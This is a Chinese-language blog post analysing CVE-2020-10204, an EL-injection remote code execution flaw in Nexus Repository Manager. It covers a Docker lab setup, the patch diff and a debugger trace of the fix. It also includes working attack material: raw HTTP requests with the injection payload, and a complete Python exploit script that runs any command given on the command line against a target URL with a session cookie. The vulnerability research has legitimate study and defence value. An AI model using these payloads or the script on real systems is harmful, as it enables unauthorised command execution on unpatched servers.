<!DOCTYPE html>
<html>
<head>
  <meta charset="utf-8">
  
  <title>She11c0de&#39;s blogs</title>
  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
  <meta name="description" content="（CVE-2020-10204）Nexus Repository Manager 远程执行代码漏洞一、漏洞简介二、漏洞影响所有以前的Nexus Repository Manager 3.x OSS &#x2F; Pro最高版本包括3.21.1 三、复现过程环境搭建下载pull下漏洞版本的docker https:&#x2F;&#x2F;hub.docker.com&#x2F;r&#x2F;sonatype&#x2F;nexus3&#x2F;tags docker p">
<meta property="og:type" content="article">
<meta property="og:title" content="She11c0de&#39;s blogs">
<meta property="og:url" content="https://she11c0de.github.io/2022/07/07/Nexus/%EF%BC%88CVE-2020-10204%EF%BC%89Nexus%20Repository%20Manager%20%E8%BF%9C%E7%A8%8B%E6%89%A7%E8%A1%8C%E4%BB%A3%E7%A0%81%E6%BC%8F%E6%B4%9E/index.html">
<meta property="og:site_name" content="She11c0de&#39;s blogs">
<meta property="og:description" content="（CVE-2020-10204）Nexus Repository Manager 远程执行代码漏洞一、漏洞简介二、漏洞影响所有以前的Nexus Repository Manager 3.x OSS &#x2F; Pro最高版本包括3.21.1 三、复现过程环境搭建下载pull下漏洞版本的docker https:&#x2F;&#x2F;hub.docker.com&#x2F;r&#x2F;sonatype&#x2F;nexus3&#x2F;tags docker p">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="https://she11c0de.github.io/resource/(CVE-2020-10204)NexusRepositoryManager%E8%BF%9C%E7%A8%8B%E6%89%A7%E8%A1%8C%E4%BB%A3%E7%A0%81%E6%BC%8F%E6%B4%9E/media/rId25.png">
<meta property="og:image" content="https://she11c0de.github.io/resource/(CVE-2020-10204)NexusRepositoryManager%E8%BF%9C%E7%A8%8B%E6%89%A7%E8%A1%8C%E4%BB%A3%E7%A0%81%E6%BC%8F%E6%B4%9E/media/rId26.png">
<meta property="og:image" content="https://she11c0de.github.io/resource/(CVE-2020-10204)NexusRepositoryManager%E8%BF%9C%E7%A8%8B%E6%89%A7%E8%A1%8C%E4%BB%A3%E7%A0%81%E6%BC%8F%E6%B4%9E/media/rId28.png">
<meta property="og:image" content="https://she11c0de.github.io/resource/(CVE-2020-10204)NexusRepositoryManager%E8%BF%9C%E7%A8%8B%E6%89%A7%E8%A1%8C%E4%BB%A3%E7%A0%81%E6%BC%8F%E6%B4%9E/media/rId29.png">
<meta property="og:image" content="https://she11c0de.github.io/resource/(CVE-2020-10204)NexusRepositoryManager%E8%BF%9C%E7%A8%8B%E6%89%A7%E8%A1%8C%E4%BB%A3%E7%A0%81%E6%BC%8F%E6%B4%9E/media/rId30.png">
<meta property="og:image" content="https://she11c0de.github.io/resource/(CVE-2020-10204)NexusRepositoryManager%E8%BF%9C%E7%A8%8B%E6%89%A7%E8%A1%8C%E4%BB%A3%E7%A0%81%E6%BC%8F%E6%B4%9E/media/rId31.png">
<meta property="og:image" content="https://she11c0de.github.io/resource/(CVE-2020-10204)NexusRepositoryManager%E8%BF%9C%E7%A8%8B%E6%89%A7%E8%A1%8C%E4%BB%A3%E7%A0%81%E6%BC%8F%E6%B4%9E/media/rId32.png">
<meta property="og:image" content="https://she11c0de.github.io/resource/(CVE-2020-10204)NexusRepositoryManager%E8%BF%9C%E7%A8%8B%E6%89%A7%E8%A1%8C%E4%BB%A3%E7%A0%81%E6%BC%8F%E6%B4%9E/media/rId33.png">
<meta property="og:image" content="https://she11c0de.github.io/resource/(CVE-2020-10204)NexusRepositoryManager%E8%BF%9C%E7%A8%8B%E6%89%A7%E8%A1%8C%E4%BB%A3%E7%A0%81%E6%BC%8F%E6%B4%9E/media/rId34.png">
<meta property="og:image" content="https://she11c0de.github.io/resource/(CVE-2020-10204)NexusRepositoryManager%E8%BF%9C%E7%A8%8B%E6%89%A7%E8%A1%8C%E4%BB%A3%E7%A0%81%E6%BC%8F%E6%B4%9E/media/rId35.png">
<meta property="og:image" content="https://she11c0de.github.io/resource/(CVE-2020-10204)NexusRepositoryManager%E8%BF%9C%E7%A8%8B%E6%89%A7%E8%A1%8C%E4%BB%A3%E7%A0%81%E6%BC%8F%E6%B4%9E/media/rId36.png">
<meta property="og:image" content="https://she11c0de.github.io/resource/(CVE-2020-10204)NexusRepositoryManager%E8%BF%9C%E7%A8%8B%E6%89%A7%E8%A1%8C%E4%BB%A3%E7%A0%81%E6%BC%8F%E6%B4%9E/media/rId37.png">
<meta property="og:image" content="https://she11c0de.github.io/resource/(CVE-2020-10204)NexusRepositoryManager%E8%BF%9C%E7%A8%8B%E6%89%A7%E8%A1%8C%E4%BB%A3%E7%A0%81%E6%BC%8F%E6%B4%9E/media/rId38.png">
<meta property="article:published_time" content="2022-07-08T06:26:00.127Z">
<meta property="article:modified_time" content="2022-07-08T07:24:51.670Z">
<meta property="article:author" content="She11c0de">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://she11c0de.github.io/resource/(CVE-2020-10204)NexusRepositoryManager%E8%BF%9C%E7%A8%8B%E6%89%A7%E8%A1%8C%E4%BB%A3%E7%A0%81%E6%BC%8F%E6%B4%9E/media/rId25.png">
  
  
    <link rel="icon" href="/favicon.png">
  
  <link type="text/css" href="//netdna.bootstrapcdn.com/font-awesome/4.2.0/css/font-awesome.css" rel="stylesheet">
  
<link rel="stylesheet" href="/css/style.css">

  
<link rel="stylesheet" href="/css/scrollUp/image.css">

  <!--[if lt IE 9]><script src="//cdnjs.cloudflare.com/ajax/libs/html5shiv/3.7/html5shiv.min.js"></script><![endif]-->
  
<meta name="generator" content="Hexo 5.4.2"></head>
<body>
  <div id="container">
    <div id="wrap">
      <header id="header">
  <div id="banner"></div>
  <div id="header-outer" class="outer">
    <div id="header-title" class="inner">
      <div class="logo">
        <img src="/logo.png" alt="Profile Picture">
      </div>
      <div id="title">She11c0de's blogs</div>
      
       <ul class="my-socials">
  
 
</ul>
    </div>
  </div>
  <div id="header-inner" class="">
    <nav id="main-nav">
      <a id="main-nav-toggle" class="nav-icon"></a>
      <!--
        
          
            <a class="main-nav-link" href="/">首页</a>
          
            <a class="main-nav-link" href="/categories/life">生活</a>
          
            <a class="main-nav-link" href="/archives">归档</a>
          
        
      -->
    </nav>
    <nav id="title-nav" style="display:none">
      <a href="/">She11c0de&#39;s blogs</a>
      <img src="/logo.png" alt="Profile Picture">
      <!--
      <span id="title-nav-socials">
        
       
     </span>
      -->
    </nav>
    <nav id="sub-nav">
      
      <a id="nav-search-btn" class="nav-icon" title="Search"></a>
    </nav>
    <div id="search-form-wrap">
      <form action="http://www.baidu.com/baidu" method="get" accept-charset="utf-8" class="search-form">
        <input type="search" name="word" maxlength="20" class="search-form-input" placeholder="搜索">
        <input type="submit" value="" class="search-form-submit">
        <input name=tn type=hidden value="bds">
        <input name=cl type=hidden value="3">
        <input name=ct type=hidden value="2097152">
        <input type="hidden" name="si" value="she11c0de.github.io">
      </form>
    </div>
  </div>
  <div class="site-nav" style="display: none;">
    <ul>
      
      
        <li><a href="/">首页</a></li>
      
        <li><a href="/categories/life">生活</a></li>
      
        <li><a href="/archives">归档</a></li>
      
      
    </ul>
  </div>
</header>
      <div class="outer">
        <section id="main"><article id="post-Nexus/（CVE-2020-10204）Nexus Repository Manager 远程执行代码漏洞" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2022/07/07/Nexus/%EF%BC%88CVE-2020-10204%EF%BC%89Nexus%20Repository%20Manager%20%E8%BF%9C%E7%A8%8B%E6%89%A7%E8%A1%8C%E4%BB%A3%E7%A0%81%E6%BC%8F%E6%B4%9E/" class="article-date">
  <time datetime="2022-07-08T06:26:00.127Z" itemprop="datePublished">2022-07-07</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
    <div class="article-entry" itemprop="articleBody">
      
        <h1 id="（CVE-2020-10204）Nexus-Repository-Manager-远程执行代码漏洞"><a href="#（CVE-2020-10204）Nexus-Repository-Manager-远程执行代码漏洞" class="headerlink" title="（CVE-2020-10204）Nexus Repository Manager 远程执行代码漏洞"></a>（CVE-2020-10204）Nexus Repository Manager 远程执行代码漏洞</h1><h2 id="一、漏洞简介"><a href="#一、漏洞简介" class="headerlink" title="一、漏洞简介"></a>一、漏洞简介</h2><h2 id="二、漏洞影响"><a href="#二、漏洞影响" class="headerlink" title="二、漏洞影响"></a>二、漏洞影响</h2><p>所有以前的Nexus Repository Manager 3.x OSS / Pro最高版本包括3.21.1</p>
<h2 id="三、复现过程"><a href="#三、复现过程" class="headerlink" title="三、复现过程"></a>三、复现过程</h2><h3 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h3><p>下载pull下漏洞版本的docker</p>
<pre><code>https://hub.docker.com/r/sonatype/nexus3/tags
docker pull sonatype/nexus3:3.21.1
</code></pre>
<p>然后切成root用户进入容器修改启动项**/opt/sonatype/nexus/bin/nexus**</p>
<pre><code>run)

$INSTALL4J_JAVA_PREFIX exec &quot;$app_java_home/bin/java&quot;  -Xdebug -server -Xrunjdwp:transport=dt_socket,server=y,suspend=n,address=8888 -Dinstall4j.jvmDir=&quot;$app_java_home&quot; -Dexe4j.moduleName=&quot;$prg_dir/$progname&quot; &quot;-XX:+UnlockDiagnosticVMOptions&quot; &quot;-Dinstall4j.launcherId=245&quot; &quot;-Dinstall4j.swt=false&quot; &quot;$vmov_1&quot; &quot;$vmov_2&quot; &quot;$vmov_3&quot; &quot;$vmov_4&quot; &quot;$vmov_5&quot; $INSTALL4J_ADD_VM_PARAMS -classpath &quot;$local_classpath&quot; com.install4j.runtime.launcher.UnixLauncher run 9d17dc87 0 0 org.sonatype.nexus.karaf.NexusMain
</code></pre>
<p><img src="/resource/(CVE-2020-10204)NexusRepositoryManager%E8%BF%9C%E7%A8%8B%E6%89%A7%E8%A1%8C%E4%BB%A3%E7%A0%81%E6%BC%8F%E6%B4%9E/media/rId25.png"></p>
<p>然后在<strong><a target="_blank" rel="noopener" href="https://github.com/sonatype/nexus-public">https://github.com/sonatype/nexus-public</a></strong>下载源码,导入idea,然后配好远程配置连上去即可调试。</p>
<p><img src="/resource/(CVE-2020-10204)NexusRepositoryManager%E8%BF%9C%E7%A8%8B%E6%89%A7%E8%A1%8C%E4%BB%A3%E7%A0%81%E6%BC%8F%E6%B4%9E/media/rId26.png"></p>
<h3 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><p>我们先来diff一下3.21.0和3.21.2的区别,找一下官方修复的痕迹</p>
<p><img src="/resource/(CVE-2020-10204)NexusRepositoryManager%E8%BF%9C%E7%A8%8B%E6%89%A7%E8%A1%8C%E4%BB%A3%E7%A0%81%E6%BC%8F%E6%B4%9E/media/rId28.png"></p>
<p>可以看到有很明显的漏洞修复痕迹,EL表达式注入的限制被绕过了,其实我们看到测试文件</p>
<pre><code>@Test
  public void testStripJavaEl_bugged_interpolator() &#123;
    String test = &quot;$\\A&#123;badstuffinhere&#125;&quot;;
    String result = underTest.stripJavaEl(test);
    assertThat(result, is(&quot;&#123;badstuffinhere&#125;&quot;));
  &#125;
</code></pre>
<p>也可以直接知道绕过方法,这里我直接给我rce的poc</p>
<pre><code>$\\A&#123;&#39;&#39;.getClass().forName(&#39;java.lang.Runtime&#39;).getMethods()[6].invoke(&#39;&#39;.getClass().forName(&#39;java.lang.Runtime&#39;)).exec(&#39;touch /tmp/sssss&#39;)&#125;
</code></pre>
<p>为什么增加了<code>\A</code>还不影响表达式的解析呢,这个我后面说,先构造出完整poc</p>
<p>那么我们找一下哪些接口会使用</p>
<p><img src="/resource/(CVE-2020-10204)NexusRepositoryManager%E8%BF%9C%E7%A8%8B%E6%89%A7%E8%A1%8C%E4%BB%A3%E7%A0%81%E6%BC%8F%E6%B4%9E/media/rId29.png"></p>
<p>可以看到总过有三处,以第一处Roles为例,</p>
<p><img src="/resource/(CVE-2020-10204)NexusRepositoryManager%E8%BF%9C%E7%A8%8B%E6%89%A7%E8%A1%8C%E4%BB%A3%E7%A0%81%E6%BC%8F%E6%B4%9E/media/rId30.png"></p>
<p>可以找到有多处注解使用的地方,比如说新建用户/更新用户,构造Poc如下</p>
<pre><code>POST /service/extdirect HTTP/1.1
Host: 127.0.0.1:8081
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:69.0) Gecko/20100101 Firefox/69.0
Accept: */*
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
X-Nexus-UI: true
NX-ANTI-CSRF-TOKEN: 0.029301195082771514
Content-Type: application/json
X-Requested-With: XMLHttpRequest
Content-Length: 350
Connection: close
Referer: http://127.0.0.1:8081/
Cookie: NX-ANTI-CSRF-TOKEN=0.029301195082771514; NXSESSIONID=7eaf0643-2707-445a-b17d-aedced6db8e5

&#123;&quot;action&quot;:&quot;coreui_User&quot;,&quot;method&quot;:&quot;create&quot;,&quot;data&quot;:[&#123;&quot;userId&quot;:&quot;3&quot;,&quot;version&quot;:&quot;&quot;,&quot;firstName&quot;:&quot;test&quot;,&quot;lastName&quot;:&quot;test&quot;,&quot;email&quot;:&quot;test@test.com&quot;,&quot;status&quot;:&quot;active&quot;,&quot;roles&quot;:[&quot;$\\X&#123;&#39;&#39;.getClass().forName(&#39;java.lang.Runtime&#39;).getMethods()[6].invoke(&#39;&#39;.getClass().forName(&#39;java.lang.Runtime&#39;)).exec(&#39;touch /tmp/rce&#39;)&#125;&quot;],&quot;password&quot;:&quot;admin&quot;&#125;],&quot;type&quot;:&quot;rpc&quot;,&quot;tid&quot;:33&#125;
</code></pre>
<p><img src="/resource/(CVE-2020-10204)NexusRepositoryManager%E8%BF%9C%E7%A8%8B%E6%89%A7%E8%A1%8C%E4%BB%A3%E7%A0%81%E6%BC%8F%E6%B4%9E/media/rId31.png"></p>
<p>以及其他几处注解使用的地方</p>
<p><img src="/resource/(CVE-2020-10204)NexusRepositoryManager%E8%BF%9C%E7%A8%8B%E6%89%A7%E8%A1%8C%E4%BB%A3%E7%A0%81%E6%BC%8F%E6%B4%9E/media/rId32.png"></p>
<p>还有一个问题为什么增加<code>\A</code>不会影响表达式的解析呢?</p>
<p>在<code>/org/hibernate/validator/hibernate-validator/6.1.0.Final/hibernate-validator-6.1.0.Final.jar!/org/hibernate/validator/messageinterpolation/AbstractMessageInterpolator.class</code>对传入的字符串进行了两次处理,</p>
<p>原本的字符串为<code>Missing roles: [$\B&#123;&#39;&#39;.getClass().forName(&#39;java.lang.Runtime&#39;).getMethods()[6].invoke(&#39;&#39;.getClass().forName(&#39;java.lang.Runtime&#39;)).exec(&#39;touch /tmp/rce&#39;)&#125;]</code></p>
<p>然后第一次处理后的结果</p>
<p><img src="/resource/(CVE-2020-10204)NexusRepositoryManager%E8%BF%9C%E7%A8%8B%E6%89%A7%E8%A1%8C%E4%BB%A3%E7%A0%81%E6%BC%8F%E6%B4%9E/media/rId33.png"></p>
<p>第二次处理后的结果</p>
<p><img src="/resource/(CVE-2020-10204)NexusRepositoryManager%E8%BF%9C%E7%A8%8B%E6%89%A7%E8%A1%8C%E4%BB%A3%E7%A0%81%E6%BC%8F%E6%B4%9E/media/rId34.png"></p>
<p>最后解析的还是<code>$&#123;xxxx&#125;</code>这样子。</p>
<p>我在3.21.1版本测试<code>$\\\B&#123;&#125;</code>这样也是可以执行的,但是增加替换规则只是限制了<code>A</code>啊,那这样不就还是可以绕过嘛?</p>
<p><img src="/resource/(CVE-2020-10204)NexusRepositoryManager%E8%BF%9C%E7%A8%8B%E6%89%A7%E8%A1%8C%E4%BB%A3%E7%A0%81%E6%BC%8F%E6%B4%9E/media/rId35.png"></p>
<p>然后我启了一个<code>3.21.2</code>版本的docker,测试发现并不行,很困惑,这里我跟一下原因。</p>
<p>在我跟到<code>/org/hibernate/validator/messageinterpolation/AbstractMessageInterpolator.class</code>发现大致调用堆栈是差不多的</p>
<p><img src="/resource/(CVE-2020-10204)NexusRepositoryManager%E8%BF%9C%E7%A8%8B%E6%89%A7%E8%A1%8C%E4%BB%A3%E7%A0%81%E6%BC%8F%E6%B4%9E/media/rId36.png"></p>
<p>但是再往下就有区别的,3.21.0版本调用了<code>/org/hibernate/validator/messageinterpolation/ResourceBundleMessageInterpolator.class@InterpolationTerm</code>,而3.21.2版本调用的是<code>/org/hibernate/validator/messageinterpolation/ParameterMessageInterpolator.class@InterpolationTerm</code>,但是最开始的区别并不是这里,这两个类都是继承了AbstractMessageInterpolator,然后重写的<code>public String interpolate(Context context, Locale locale, String term)</code>方法不同,</p>
<p><code>ParameterMessageInterpolator.class@InterpolationTerm</code>会进行表达式的检测</p>
<pre><code>public String interpolate(Context context, Locale locale, String term) &#123;
        if (InterpolationTerm.isElExpression(term)) &#123;
            LOG.warnElIsUnsupported(term);
            return term;
        &#125; else &#123;
            ParameterTermResolver parameterTermResolver = new ParameterTermResolver();
            return parameterTermResolver.interpolate(context, term);
        &#125;
    &#125;
</code></pre>
<p>如果表达式以<code>$</code>开头,会直接打印warning,然后返回表达式字符串。</p>
<p><img src="/resource/(CVE-2020-10204)NexusRepositoryManager%E8%BF%9C%E7%A8%8B%E6%89%A7%E8%A1%8C%E4%BB%A3%E7%A0%81%E6%BC%8F%E6%B4%9E/media/rId37.png"></p>
<p>但是这里是hibernate包中的,我们需要去找到源头,也就是nexus开发者是怎么去修复的呢?</p>
<p>在一阵搜索中,我在<code>nexus-public-release-3.22.0-02/components/nexus-validation/src/main/java/org/sonatype/nexus/validation/ValidationModule.java</code>找到了</p>
<p><img src="/resource/(CVE-2020-10204)NexusRepositoryManager%E8%BF%9C%E7%A8%8B%E6%89%A7%E8%A1%8C%E4%BB%A3%E7%A0%81%E6%BC%8F%E6%B4%9E/media/rId38.png"></p>
<p>通过搜索资料了解到Hibernate<br>Validator提供了ParameterMessageInterpolator来处理消息,并且不解析使用<code>$</code>的表达式,也就是说即使绕过了replace的地方,也不会作为表达式进行解析,而是直接返回了。</p>
<h3 id="poc"><a href="#poc" class="headerlink" title="poc"></a>poc</h3><pre><code>cve-2020-10204_cmd.py
#!/usr/bin/python3
# -*- coding:utf-8 -*-
# author:zhzyker
# from:https://github.com/zhzyker/exphub

import sys
import requests

if len(sys.argv)!=4:
    print(&#39;+---------------------------------------------------------------------------------------------------------+&#39;)
    print(&#39;+ DES: by zhzyker as https://github.com/zhzyker/exphub                                                    +&#39;)
    print(&#39;+      CVE-2020-10204 Nexus Repository Manager 3 Remote Code Execution                                    +&#39;)
    print(&#39;+---------------------------------------------------------------------------------------------------------+&#39;)
    print(&#39;+ USE: python3 &lt;filename&gt; &lt;url&gt; &lt;session&gt; &lt;cmd&gt;                                                           +&#39;)
    print(&#39;+ EXP: python3 cve-2020-11444_exp.py http://ip:8081 6c012a5e-88d9-4f96-a05f-3790294dc49a &quot;touch /tmp/233&quot; +&#39;)
    print(&#39;+ VER: Nexus Repository Manager 3.x OSS / Pro &lt;= 3.21.1                                                   +&#39;)
    print(&#39;+---------------------------------------------------------------------------------------------------------+&#39;)
    sys.exit(0)

url = sys.argv[1]
vuln_url = url + &quot;/service/extdirect&quot;
session = sys.argv[2]
cmd = sys.argv[3]

headers = &#123;
    &#39;accept&#39;: &quot;application/json&quot;,
    &#39;User-Agent&#39;: &quot;Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.138 Safari/537.36&quot;,
    &#39;NX-ANTI-CSRF-TOKEN&#39;: &quot;0.856555763510765&quot;,
    &#39;Content-Type&#39;: &quot;application/json&quot;,
    &#39;Cookie&#39;: &quot;jenkins-timestamper-offset=-28800000; Hm_lvt_8346bb07e7843cd10a2ee33017b3d627=1583249520; NX-ANTI-CSRF-TOKEN=0.856555763510765; NXSESSIONID=&quot;+session+&quot;&quot;
&#125;
data = &quot;&quot;&quot;
&#123;&quot;action&quot;:&quot;coreui_Role&quot;,&quot;method&quot;:&quot;create&quot;,&quot;data&quot;:[&#123;&quot;version&quot;:&quot;&quot;,&quot;source&quot;:&quot;default&quot;,&quot;id&quot;:&quot;1111&quot;,&quot;name&quot;:&quot;2222&quot;,&quot;description&quot;:&quot;3333&quot;,&quot;privileges&quot;:[&quot;$\\\A&#123;&#39;&#39;.getClass().forName(&#39;java.lang.Runtime&#39;).getMethods()[6].invoke(null).exec(&#39;%s&#39;)&#125;&quot;],&quot;roles&quot;:[]&#125;],&quot;type&quot;:&quot;rpc&quot;,&quot;tid&quot;:89&#125;
&quot;&quot;&quot; % cmd

r = requests.post(url=vuln_url, headers=headers, data=data, timeout=20)
if r.status_code == 200:
    if &quot;UNIXProcess&quot; in r.text:
        print (&quot;[+] Command Executed Successfully (Not Echo)&quot;)
    else:
        print (&quot;[-] Command Execution Failed&quot;)
else:
    print (&quot;[-] Target Not CVE-2020-10204 Vuln Good Luck&quot;)
</code></pre>
<h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><blockquote>
<p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/7559">https://xz.aliyun.com/t/7559</a></p>
</blockquote>

      
    </div>
    <footer class="article-footer">
      
        <a data-url="https://she11c0de.github.io/2022/07/07/Nexus/%EF%BC%88CVE-2020-10204%EF%BC%89Nexus%20Repository%20Manager%20%E8%BF%9C%E7%A8%8B%E6%89%A7%E8%A1%8C%E4%BB%A3%E7%A0%81%E6%BC%8F%E6%B4%9E/" data-id="cl5c2qsxd00c6y8v14m1e9h96" class="article-share-link">分享到</a>
      

      
    </footer>
  </div>
  
    
<nav id="article-nav">
  
    <a href="/2022/07/07/Nexus/%EF%BC%88CVE-2020-11444%EF%BC%89Nexus%20Repository%20Manager%20%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/" id="article-nav-newer" class="article-nav-link-wrap">
      <strong class="article-nav-caption">Newer</strong>
      <div class="article-nav-title">
        
          (no title)
        
      </div>
    </a>
  
  
    <a href="/2022/07/07/Nexus/%EF%BC%88CVE-2020-10199%EF%BC%89Nexus%20Repository%20Manager%20%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/" id="article-nav-older" class="article-nav-link-wrap">
      <strong class="article-nav-caption">Older</strong>
      <div class="article-nav-title"></div>
    </a>
  
</nav>

  
</article>

</section>
        
      </div>
      <footer id="footer">
  
  <div class="outer">
    <div id="footer-info" class="inner">
      &copy; 2022 She11c0de<br>
      Theme <a href="https://github.com/henryhuang/oishi" target="_blank">Oishi</a>, Powered by <a href="http://hexo.io/" target="_blank">Hexo</a>
    </div>
  </div>
</footer>
    </div>
    <!--
      <nav id="mobile-nav">
  
    <a href="/" class="mobile-nav-link">首页</a>
  
    <a href="/categories/life" class="mobile-nav-link">生活</a>
  
    <a href="/archives" class="mobile-nav-link">归档</a>
  
</nav>
    -->
    

<!-- 百度分享 start -->

<!-- 百度分享 end -->

<script src="//cdn.bootcss.com/jquery/1.11.1/jquery.min.js"></script>




<script src="/js/jquery.scrollUp.min.js"></script>


<script src="/js/jquery.transform.js"></script>


<script src="/js/menu.js"></script>



<script src="/js/script.js"></script>


<script src="/js/scrollUp.js"></script>


  </div>
</body>
</html>